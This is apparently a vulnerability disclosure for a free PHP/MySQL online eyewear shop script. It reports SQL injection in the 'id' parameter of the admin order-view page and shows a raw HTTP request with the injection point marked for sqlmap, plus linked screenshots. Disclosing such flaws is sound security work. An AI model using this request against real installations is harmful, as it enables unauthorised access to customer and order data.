# Online Eyewear Shop Website has SQL injection

BUG_Author: Murasaki

URL: /oews/admin/?page=orders/view_order&id=*
Link：https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

Parameter "id" (GET), exists SQL injection vulnerability

SQL injection is found in the administrator background order interface, and the results are obtained by using the data package sent by the administrator authority.

The data package is as follows
```
GET /oews/admin/?page=orders/view_order&id=4* HTTP/1.1
Host: 192.168.8.131
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.8.131/oews/admin/?page=orders
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2alcecghcccelhr289f3t3a01u
Connection: close
```

![](https://github.com/1MurasaKi/Eyewear_Shop_SQLi/blob/main/view_order.png?raw=true)

![](https://github.com/1MurasaKi/Eyewear_Shop_SQLi/blob/main/SQLmap.png?raw=true)
